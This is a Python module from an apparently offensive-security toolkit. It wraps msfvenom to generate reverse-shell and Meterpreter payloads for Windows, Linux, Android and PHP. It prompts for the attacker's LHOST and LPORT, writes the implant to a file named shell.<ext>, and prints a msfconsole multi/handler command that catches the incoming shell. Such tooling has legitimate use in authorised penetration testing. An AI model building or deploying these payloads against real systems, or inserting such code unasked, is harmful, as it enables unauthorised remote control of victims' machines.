"""
Payload Generator - Msfvenom wrapper
"""

import shutil
import subprocess

from rich.console import Console
from rich.prompt import Prompt

from redai.core.display import display
from redai.database.repository import save_scan


console = Console()


def payload_gen(project: str = "General", auto: bool = False):
    """Generador de Payloads con Msfvenom."""
    if not auto:
        display.header("Msfvenom Payload Generator")
    
    # OS Target
    os_type = Prompt.ask("OS Target", choices=["windows", "linux", "android", "php"], default="windows")
    
    # Architecture
    arch = "x64"
    if os_type in ["windows", "linux"]:
        arch = Prompt.ask("Arch", choices=["x86", "x64"], default="x64")
    
    # Payload Type
    p_type = "shell_reverse_tcp"
    if os_type == "windows":
        p_type = Prompt.ask("Payload", choices=["meterpreter/reverse_tcp", "shell/reverse_tcp"], default="meterpreter/reverse_tcp")
    
    # Connection Info
    lhost = Prompt.ask("LHOST (Your IP)", default="127.0.0.1")
    lport = Prompt.ask("LPORT", default="4444")
    
    # Build payload string
    full_payload = ""
    ext = "exe"
    
    if os_type == "windows":
        full_payload = f"windows/{arch}/{p_type}" if arch == "x64" else f"windows/{p_type}"
        ext = "exe"
    elif os_type == "linux":
        full_payload = f"linux/{arch}/shell_reverse_tcp"
        ext = "elf"
    elif os_type == "android":
        full_payload = "android/meterpreter/reverse_tcp"
        ext = "apk"
    elif os_type == "php":
        full_payload = "php/meterpreter_reverse_tcp"
        ext = "php"
    
    outfile = f"shell.{ext}"
    cmd = f"msfvenom -p {full_payload} LHOST={lhost} LPORT={lport} -f {ext} -o {outfile}"
    
    display.info(f"Generating: {full_payload}")
    display.step(f"Command: {cmd}")
    
    if not shutil.which("msfvenom"):
        display.error("msfvenom not found. Install Metasploit Framework.")
        display.info(f"Manual command: {cmd}")
        save_scan("payload", "payload_gen", cmd, project)
        return
    
    try:
        proc = subprocess.run(cmd.split(), capture_output=True, text=True)
        
        if proc.returncode == 0:
            display.success(f"Payload created: {outfile}")
            display.info(f"Start listener: msfconsole -x 'use exploit/multi/handler; set payload {full_payload}; set LHOST {lhost}; set LPORT {lport}; run'")
        else:
            display.error(f"Generation failed: {proc.stderr}")
            
        save_scan("payload", "payload_gen", proc.stdout or cmd, project)
        
    except Exception as e:
        display.error(f"Error: {e}")
